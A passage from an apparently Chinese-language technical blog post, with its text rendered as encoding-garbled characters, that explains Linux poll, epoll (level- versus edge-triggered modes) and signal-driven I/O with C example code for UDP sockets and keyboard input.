<p>poll æ˜¯ select çš„æ”¹è¿›ç‰ˆ IO å¤šè·¯å¤ç”¨æ¨¡å‹ã€‚ç›¸æ¯”ä¹‹ä¸‹ä¸»è¦æœ‰å¦‚ä¸‹æ”¹è¿›ï¼š</p>
<ol>
<li>æ²¡æœ‰ 1024 çš„ç¡¬é™åˆ¶ï¼šselect å—åˆ° FD_SETSIZE çš„ä½å›¾å¤§å°é™åˆ¶ï¼ˆé»˜è®¤ 1024ï¼‰ï¼Œè€Œ poll ä¼ å…¥çš„æ˜¯æ•°ç»„æŒ‡é’ˆï¼Œåªè¦å†…å­˜å¤Ÿï¼Œç›‘å¬ 1 ä¸‡ä¸ªã€10 ä¸‡ä¸ªéƒ½æ²¡é—®é¢˜ã€‚</li>
<li>è¾“å…¥è¾“å‡ºåˆ†ç¦»ï¼šselect æ¯æ¬¡è°ƒç”¨éƒ½è¦é‡ç½® fd_setï¼Œå› ä¸ºå†…æ ¸ä¼šç›´æ¥ä¿®æ”¹å®ƒï¼Œæ‰€ä»¥è¦è‡ªå·±æŠŠfd_setä¿®æ”¹æ­£ç¡®ã€‚è€Œ poll æŠŠâ€œæ„Ÿå…´è¶£çš„äº‹ä»¶â€ (events) å’Œâ€œå®é™…å‘ç”Ÿçš„äº‹ä»¶â€ (revents) åˆ†å¼€äº†ï¼Œè¿™æ ·ä½ å°±ä¸éœ€è¦åœ¨å¾ªç¯é‡Œä¸åœåœ°é‡æ–°åˆå§‹åŒ–æ•°ç»„ã€‚</li>
</ol>
<h4 data-id="heading-15">ç¬¬ä¸€é˜¶æ®µ</h4>
<p>ç”¨æˆ·è¿›ç¨‹è°ƒç”¨ pollï¼Œå¹¶ä¼ å…¥ä¸€ä¸ª pollfd æ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«å¤šä¸ªéœ€è¦ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦åŠå…¶å…³æ³¨çš„äº‹ä»¶ç±»å‹ï¼ˆå¦‚å¯è¯»ã€å¯å†™ç­‰ï¼‰ã€‚<br/>
poll ä¼šåœ¨å†…æ ¸ä¸­æ£€æŸ¥è¿™äº›æ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ï¼Œåªè¦ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ª fd å˜ä¸ºå°±ç»ªï¼Œpoll å³è¿”å›ã€‚åœ¨è¿™ä¸€é˜¶æ®µï¼Œå¦‚æœæ²¡æœ‰ä»»ä½• fd å°±ç»ªï¼Œç”¨æˆ·è¿›ç¨‹å°†è¢«é˜»å¡ï¼ˆæˆ–åœ¨è¶…æ—¶åè¿”å›ï¼‰ã€‚</p>
<h4 data-id="heading-16">ç¬¬äºŒé˜¶æ®µ</h4>
<p>æ–‡ä»¶æè¿°ç¬¦å‘ç”Ÿäº†ç”¨æˆ·æ‰€å…³å¿ƒçš„äº‹ä»¶,ç”¨æˆ·è¿›ç¨‹éšåéå† pollfd æ•°ç»„ï¼Œé€šè¿‡æ£€æŸ¥æ¯ä¸ªå…ƒç´ çš„ revents å­—æ®µå®šä½åˆ°å°±ç»ªçš„ fdï¼Œå¹¶ä¾æ¬¡å¯¹fdè°ƒç”¨ read / recvfrom / write ç­‰ç³»ç»Ÿè°ƒç”¨è¿›è¡Œå®é™…çš„ IO æ“ä½œï¼Œå†…æ ¸å†å°†æ•°æ®ä»å†…æ ¸æ€æ‹·è´åˆ°ç”¨æˆ·è¿›ç¨‹ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb0b0232bcf34308aee7de4ac027e034~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=fDGUcwJbEN9tCnDaYHZcof9PquQ%3D" alt="" loading="lazy"/></p>
<p><strong>pollå‚è€ƒä»£ç </strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// --- å‡†å¤‡å·¥ä½œï¼šåˆ›å»ºä¸¤ä¸ªæµ‹è¯•ç”¨çš„ Socket ---</span>
    <span class="hljs-type">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>); <span class="hljs-comment">// ç›‘å¬ 8080</span>
    <span class="hljs-type">int</span> client_fd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>); <span class="hljs-comment">// ç›‘å¬ 9090 </span>
    
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr1</span>, <span class="hljs-title">addr2</span>;</span>
    <span class="hljs-comment">// ç»‘å®š 8080</span>
    addr1.sin_family = AF_INET; addr1.sin_port = htons(<span class="hljs-number">8080</span>); addr1.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;addr1, <span class="hljs-keyword">sizeof</span>(addr1));
    <span class="hljs-comment">// ç»‘å®š 9090</span>
    addr2.sin_family = AF_INET; addr2.sin_port = htons(<span class="hljs-number">9090</span>); addr2.sin_addr.s_addr = INADDR_ANY;
    bind(client_fd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;addr2, <span class="hljs-keyword">sizeof</span>(addr2));

    <span class="hljs-comment">// --- æ ¸å¿ƒé€»è¾‘å¼€å§‹ ---</span>

    <span class="hljs-comment">// 1. å®šä¹‰ä¸€ä¸ª pollfd æ•°ç»„ï¼Œä½“ç°â€œå¤šè·¯â€</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span>[3];</span> 

    <span class="hljs-comment">// ç¬¬ä¸€ä¸ª fdï¼šç½‘ç»œ Socket (ç›‘å¬è¯»)</span>
    fds[<span class="hljs-number">0</span>].fd = sockfd;
    <span class="hljs-comment">//ã€è¾“å…¥å‚æ•°ã€‘æˆ‘æ„Ÿå…´è¶£çš„äº‹ä»¶ (å¦‚ POLLIN | POLLOUT)</span>
    fds[<span class="hljs-number">0</span>].events = POLLIN;

    <span class="hljs-comment">// ç¬¬äºŒä¸ª fdï¼šé”®ç›˜è¾“å…¥ (ç›‘å¬è¯»)</span>
    fds[<span class="hljs-number">1</span>].fd = STDIN_FILENO;
    fds[<span class="hljs-number">1</span>].events = POLLIN;

    <span class="hljs-comment">// ç¬¬ä¸‰ä¸ª fdï¼šå¦ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ (åŒæ—¶ç›‘å¬è¯»å’Œå†™)</span>
    fds[<span class="hljs-number">2</span>].fd = client_fd;
    fds[<span class="hljs-number">2</span>].events = POLLIN | POLLOUT; 

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Poll æ­£åœ¨åŒæ—¶ç›‘å¬ï¼š[8080ç«¯å£] [é”®ç›˜è¾“å…¥] [9090ç«¯å£è¯»å†™]...\n"</span>);

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-comment">// 2. ä¸€æ¬¡æ€§æŠŠæ•´ä¸ªæ•°ç»„ä¸¢ç»™å†…æ ¸ï¼ˆç¬¬ä¸€é˜¶æ®µï¼šé˜»å¡ç­‰å¾…ï¼‰</span>
        <span class="hljs-type">int</span> ret = poll(fds, <span class="hljs-number">3</span>, <span class="hljs-number">-1</span>); 

        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) { perror(<span class="hljs-string">"poll å‡ºé”™"</span>); <span class="hljs-keyword">break</span>; }

        <span class="hljs-comment">// 3. éå†æ•°ç»„ï¼Œæ‰¾åˆ°æ˜¯è°å°±ç»ªäº†ï¼ˆç¬¬äºŒé˜¶æ®µï¼šæ•°æ®æ‹·è´ä¸å¤„ç†ï¼‰</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) {
            <span class="hljs-comment">//ã€è¾“å‡ºå‚æ•°ã€‘å†…æ ¸å®é™…å‘ç”Ÿçš„äº‹ä»¶ (å†…æ ¸å¡«å†™çš„)</span>
            <span class="hljs-keyword">if</span> (fds[i].revents &amp; POLLIN) { <span class="hljs-comment">// å¦‚æœæ˜¯è¯»å°±ç»ª</span>
                <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];
                <span class="hljs-keyword">if</span> (fds[i].fd == STDIN_FILENO) {
                    fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-built_in">stdin</span>);
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt;&gt;&gt; è§¦å‘é”®ç›˜è¾“å…¥: %s"</span>, buf);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-type">ssize_t</span> n = recvfrom(fds[i].fd, buf, <span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
                    buf[n] = <span class="hljs-string">'\0'</span>;
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt;&gt;&gt; è§¦å‘ Socket(%d) æ¥æ”¶: %s\n"</span>, fds[i].fd, buf);
                }
            }
            
            <span class="hljs-keyword">if</span> (fds[i].revents &amp; POLLOUT) { <span class="hljs-comment">// å¦‚æœæ˜¯å†™å°±ç»ª</span>
                <span class="hljs-comment">// ä»…åœ¨ client_fd éœ€è¦å†™ä¸”ç¼“å†²åŒºæœ‰ç©ºä½æ—¶è§¦å‘</span>
                <span class="hljs-keyword">if</span> (fds[i].fd == client_fd) {
                    <span class="hljs-comment">//TODO</span>
                }
            }
        }
    }

    close(sockfd); close(client_fd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-17">epoll</h3>
<p>epollç›¸æ¯”äºselect / pollï¼Œå®ƒä¸éœ€è¦éå†å…¨éƒ¨ fd, åªè¿”å›çœŸæ­£å°±ç»ªçš„ fd,  fd çš„æ³¨å†Œä¸äº‹ä»¶ç­‰å¾…è§£è€¦</p>
<h4 data-id="heading-18">ç¬¬ä¸€é˜¶æ®µ</h4>
<p>ç”¨æˆ·è¿›ç¨‹é¦–å…ˆé€šè¿‡ epoll_create åˆ›å»ºä¸€ä¸ª epoll å®ä¾‹ï¼Œå¹¶ä½¿ç”¨ epoll_ctl å°†éœ€è¦ç›‘å¬çš„å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦æ³¨å†Œåˆ° epoll ä¸­ï¼ŒåŒæ—¶æŒ‡å®šå…³å¿ƒçš„äº‹ä»¶ç±»å‹ï¼ˆå¦‚å¯è¯»ã€å¯å†™ç­‰ï¼‰ã€‚<br/>
å½“ç”¨æˆ·è¿›ç¨‹è°ƒç”¨ epoll_wait æ—¶ï¼Œå¦‚æœæ²¡æœ‰å·²å°±ç»ªçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿›ç¨‹å°†è¢«é˜»å¡ï¼›ä¸€æ—¦ä»»æ„ä¸€ä¸ªæˆ–å¤šä¸ªå·²æ³¨å†Œçš„ fd å‘ç”Ÿäº†ç”¨æˆ·å…³å¿ƒçš„äº‹ä»¶ï¼Œepoll_wait ç«‹å³è¿”å›ã€‚</p>
<hr/>
<h4 data-id="heading-19">ç¬¬äºŒé˜¶æ®µ</h4>
<p>å½“ epoll_wait è¿”å›æ—¶ï¼Œè¡¨ç¤ºå·²æœ‰æ–‡ä»¶æè¿°ç¬¦å¤„äºå°±ç»ªçŠ¶æ€ã€‚ ç”¨æˆ·è¿›ç¨‹å¯ä»¥ç›´æ¥ä» epoll_wait è¿”å›çš„äº‹ä»¶æ•°ç»„ä¸­è·å–æ‰€æœ‰å°±ç»ªçš„ fdï¼Œå¹¶ä¾æ¬¡å¯¹è¿™äº› fd è°ƒç”¨ recvfrom  ç­‰ç³»ç»Ÿè°ƒç”¨å®Œæˆå®é™…çš„ IO æ“ä½œï¼Œå†…æ ¸å†å°†æ•°æ®ä»å†…æ ¸æ€æ‹·è´åˆ°ç”¨æˆ·è¿›ç¨‹ã€‚</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fd0685970d94de29b797cc96b2606f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=IMTQu6QhxcgExnZhMGDApOezpzQ%3D" alt="" loading="lazy"/></p>
<p><strong>epollå‚è€ƒä»£ç </strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EVENTS 5</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. å‡†å¤‡ç½‘ç»œ Socket</span>
    <span class="hljs-type">int</span> listen_sock = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span>
    addr.sin_family = AF_INET; addr.sin_port = htons(<span class="hljs-number">8080</span>); addr.sin_addr.s_addr = INADDR_ANY;
    bind(listen_sock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;addr, <span class="hljs-keyword">sizeof</span>(addr));

    <span class="hljs-comment">// 2. åˆ›å»º epoll å®ä¾‹ (å†…æ ¸çº¢é»‘æ ‘çš„å¼€ç«¯)</span>
    <span class="hljs-type">int</span> epfd = epoll_create1(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">if</span> (epfd == <span class="hljs-number">-1</span>) { perror(<span class="hljs-string">"epoll_create1"</span>); <span class="hljs-built_in">exit</span>(EXIT_FAILURE); }

    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">ev</span>, <span class="hljs-title">events</span>[<span class="hljs-title">MAX_EVENTS</span>];</span>

    <span class="hljs-comment">// 3. æ³¨å†Œã€ç½‘ç»œ Socketã€‘åˆ° epoll</span>
    ev.events = EPOLLIN;     <span class="hljs-comment">// ç›‘å¬è¯»å°±ç»ª, </span>
    ev.data.fd = listen_sock; 
    epoll_ctl(epfd, EPOLL_CTL_ADD, listen_sock, &amp;ev);

    <span class="hljs-comment">// 4. æ³¨å†Œã€æ ‡å‡†è¾“å…¥/é”®ç›˜ã€‘åˆ° epoll</span>
    ev.events = EPOLLIN;
    ev.data.fd = STDIN_FILENO; <span class="hljs-comment">// æ–‡ä»¶æè¿°ç¬¦ 0</span>
    epoll_ctl(epfd, EPOLL_CTL_ADD, STDIN_FILENO, &amp;ev);

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"epoll æ­£åœ¨åŒæ—¶ç›‘å¬ [8080ç«¯å£] å’Œ [é”®ç›˜è¾“å…¥]...\n"</span>);

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
        <span class="hljs-comment">// 5. ç­‰å¾…å°±ç»ªé“¾è¡¨ä¸­æœ‰äº‹ä»¶ (ç¬¬ä¸€é˜¶æ®µ)</span>
        <span class="hljs-type">int</span> nfds = epoll_wait(epfd, events, MAX_EVENTS, <span class="hljs-number">-1</span>);

        <span class="hljs-comment">// 6. éå†â€œä»…å°±ç»ªâ€çš„æè¿°ç¬¦ (ç¬¬äºŒé˜¶æ®µ)</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nfds; ++i) {
            <span class="hljs-keyword">if</span> (events[i].data.fd == listen_sock) {
                <span class="hljs-comment">// å¤„ç†ç½‘ç»œæ•°æ®</span>
                <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];
                <span class="hljs-type">ssize_t</span> n = recvfrom(listen_sock, buf, <span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
                <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) {
                    buf[n] = <span class="hljs-string">'\0'</span>;
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt;&gt;&gt; ç½‘ç»œæ¶ˆæ¯: %s\n"</span>, buf);
                }
            } 
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (events[i].data.fd == STDIN_FILENO) {
                <span class="hljs-comment">// å¤„ç†é”®ç›˜è¾“å…¥</span>
                <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];
                <span class="hljs-keyword">if</span> (fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-built_in">stdin</span>) != <span class="hljs-literal">NULL</span>) {
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&gt;&gt;&gt; é”®ç›˜è¾“å…¥: %s"</span>, buf);
                }
            }
        }
    }

    close(listen_sock);
    close(epfd);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-20">epollä¸­çš„ä¸¤ç§è§¦å‘æ¨¡å¼</h4>
<p>åœ¨epollä¸­åœ¨æ•°æ®å°±ç»ªæ—¶ï¼Œæœ‰ä¸¤ç§ä¸åŒçš„è§¦å‘æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<p><strong>1. LT (Level Triggeredï¼Œæ°´å¹³è§¦å‘)</strong></p>
<p><strong>2.ET (Edge Triggeredï¼Œè¾¹ç¼˜è§¦å‘)</strong></p>
<p>å®ƒæ˜¯åœ¨è°ƒç”¨ <code>epoll_ctl</code> æ³¨å†Œæˆ–ä¿®æ”¹æ–‡ä»¶æè¿°ç¬¦ï¼ˆfdï¼‰çš„äº‹ä»¶æ—¶ï¼Œé€šè¿‡ <code>events</code> ç»“æ„ä½“æˆå‘˜æŒ‡å®šçš„ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">ev</span>;</span>

<span class="hljs-comment">// --- è®¾å®šä¸º ET (è¾¹ç¼˜è§¦å‘) ---</span>
ev.events = EPOLLIN | EPOLLET; <span class="hljs-comment">// ç›‘å¬è¯»äº‹ä»¶ï¼Œå¹¶å¼€å¯ ET æ¨¡å¼</span>
ev.data.fd = sockfd;
epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &amp;ev);

<span class="hljs-comment">// --- è®¾å®šä¸º LT (æ°´å¹³è§¦å‘) ---</span>
ev.events = EPOLLIN;           <span class="hljs-comment">// é»˜è®¤å°±æ˜¯ LT</span>
ev.data.fd = sockfd;
epoll_ctl(epfd, EPOLL_CTL_ADD, sockfd, &amp;ev);
</code></pre>























<table><thead><tr><th><strong>è§¦å‘æ¨¡å¼</strong></th><th><strong>å†…æ ¸æé†’æ—¶æœº</strong></th><th><strong>ç¼–ç¨‹å¤æ‚åº¦</strong></th><th><strong>æ€§èƒ½ / å¹¶å‘</strong></th></tr></thead><tbody><tr><td><strong>LT (æ°´å¹³è§¦å‘)</strong></td><td><strong>åªè¦</strong>ç¼“å†²åŒºé‡Œæœ‰æ•°æ®ï¼Œ<code>epoll_wait</code> æ¯æ¬¡éƒ½ä¼šè¿”å›è¯¥ fdã€‚å› ä¸ºå¯èƒ½æ•°é‡å¤ªå¤§ä¸€æ¬¡æ²¡è¯»å®Œä¼šåå¤æé†’</td><td>ä½ï¼ˆåƒ <code>select/poll</code>ï¼‰</td><td>è¾ƒä½ï¼ˆé¢‘ç¹æé†’å¯¼è‡´ç³»ç»Ÿè°ƒç”¨å¢å¤šï¼‰</td></tr><tr><td><strong>ET (è¾¹ç¼˜è§¦å‘)</strong></td><td><strong>åªæœ‰</strong>æ•°æ®ä»æ— åˆ°æœ‰ï¼Œæˆ–è€…å¢åŠ æ—¶ï¼Œ<code>epoll_wait</code> æ‰ä¼šæé†’ä¸€æ¬¡ã€‚å¹¶åœ¨äº‹ä»¶è§¦å‘åä¸€æ¬¡æ€§å¤„ç†å®Œæ‰€æœ‰æ•°æ®ï¼Œå¦åˆ™å®¹æ˜“ä¸¢äº‹ä»¶ã€‚</td><td>é«˜ï¼ˆå¿…é¡»å¾ªç¯è¯»å®Œæ‰€æœ‰æ•°æ®ï¼‰</td><td>é«˜ï¼ˆå‡å°‘äº†å†…æ ¸æ€ä¸ç”¨æˆ·æ€åˆ‡æ¢ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-21">6. ä¿¡å·é©±åŠ¨ I/O (Signal Driven I/O)</h2>
<p>è¿›ç¨‹å‘ŠçŸ¥å†…æ ¸ï¼šå½“æè¿°ç¬¦å°±ç»ªæ—¶ï¼Œè¯·ç»™æˆ‘å‘ä¸€ä¸ª SIGIO ä¿¡å·ã€‚ç”¨æˆ·è¿›ç¨‹åœ¨ç­‰å¾…æ—¶ä¸é˜»å¡ã€‚</p>
<p>ä½†æ˜¯åœ¨ TCP ä¸­å¾ˆå°‘ä½¿ç”¨ï¼Œå› ä¸º SIGIO ä¿¡å·äº§ç”Ÿå¾—å¤ªé¢‘ç¹ï¼ˆå¦‚è¿æ¥å»ºç«‹ã€æ–­å¼€ã€æ•°æ®åˆ°è¾¾ç­‰éƒ½ä¼šè§¦å‘ï¼‰ï¼Œéš¾ä»¥åŒºåˆ†ã€‚è€Œä¸”ç”¨æˆ·è¿›ç¨‹å’Œå†…æ ¸é¢‘ç¹ä¿¡å·äº¤äº’æ€§èƒ½ä¹Ÿè¾ƒä½ã€‚</p>
<h3 data-id="heading-22">ç¬¬ä¸€é˜¶æ®µ</h3>
<p>ç”¨æˆ·è¿›ç¨‹é€šè¿‡ sigaction æ³¨å†Œ SIGIO ä¿¡å·å¤„ç†å‡½æ•°ï¼Œå¹¶ä½¿ç”¨ fcntl å°†æ–‡ä»¶æè¿°ç¬¦è®¾ç½®ä¸ºä¿¡å·é©±åŠ¨æ¨¡å¼ï¼Œå†…æ ¸å®Œæˆæ³¨å†Œåå¼€å§‹ç›‘å¬å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ç”¨æˆ·è¿›ç¨‹ä¸é˜»å¡ç­‰å¾…ï¼Œå¯ä»¥æ‰§è¡Œå…¶ä»–é€»è¾‘ï¼Œå½“æ–‡ä»¶æè¿°ç¬¦ä¸Šçš„æ•°æ®åœ¨å†…æ ¸ä¸­å‡†å¤‡å°±ç»ªæ—¶ï¼Œå†…æ ¸å‘ç”¨æˆ·è¿›ç¨‹å‘é€ SIGIO ä¿¡å·ï¼Œè§¦å‘ç”¨æˆ·æ³¨å†Œçš„ä¿¡å·å¤„ç†å‡½æ•°</p>
<h3 data-id="heading-23">ç¬¬äºŒé˜¶æ®µ</h3>
<p>ç”¨æˆ·è¿›ç¨‹æ¥æ”¶åˆ° SIGIO ä¿¡å·å›è°ƒï¼Œåœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­ï¼Œæˆ–åœ¨ä¿¡å·å¤„ç†å®Œæˆåï¼Œè°ƒç”¨ recvfrom / read ç­‰ç³»ç»Ÿè°ƒç”¨è¯»å–æ•°æ®ï¼Œå†…æ ¸å°†å°±ç»ªçš„æ•°æ®ä»å†…æ ¸ç©ºé—´æ‹·è´åˆ°ç”¨æˆ·è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´ç¼“å†²åŒºï¼Œç”¨æˆ·è¿›ç¨‹å¯¹è¯»å–åˆ°çš„æ•°æ®è¿›è¡Œä¸šåŠ¡å¤„ç†ï¼Œå®Œæˆä¸€æ¬¡ I/O æ“ä½œ</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d7390b2e963435fbf0b0739fb0be33d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA56KX6Z2iNDIx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281988&amp;x-signature=oPphJXGOfSskJ9GUD%2BmLi95wBpg%3D" alt="" loading="lazy"/></p>
<p><strong>ä¿¡å·é©±åŠ¨ I/Oå‚è€ƒä»£ç </strong></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE  <span class="hljs-comment">// å¼€å¯ GNU/Linux ç‰¹æœ‰æ‰©å±•</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span> </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span>
 
<span class="hljs-type">int</span> sockfd;

<span class="hljs-comment">// 1. ä¿¡å·å¤„ç†å‡½æ•°ï¼šå½“å†…æ ¸å‘ç°æ•°æ®å°±ç»ªæ—¶ï¼Œä¼šå¼‚æ­¥è°ƒç”¨æ­¤å‡½æ•°</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">sigio_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> {
    <span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>];
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">cliaddr</span>;</span>
    <span class="hljs-type">socklen_t</span> len = <span class="hljs-keyword">sizeof</span>(cliaddr);

    <span class="hljs-comment">/**
     * ã€ç¬¬äºŒé˜¶æ®µã€‘ï¼šæ•°æ®æ‹·è´
     * ä¿¡å·è§¦å‘è¯´æ˜ç¬¬ä¸€é˜¶æ®µï¼ˆç­‰å¾…ï¼‰å®Œæˆäº†ã€‚
     * ä½†æˆ‘ä»¬ä»éœ€æ‰‹åŠ¨è°ƒç”¨ recvfrom å°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ã€‚
     */</span>
    <span class="hljs-type">ssize_t</span> n = recvfrom(sockfd, buf, <span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;cliaddr, &amp;len);
    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) {
        buf[n] = <span class="hljs-string">'\0'</span>;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n[ä¿¡å·é€šçŸ¥] æ”¶åˆ°æ•°æ®: %s\n"</span>, buf);
    }
}

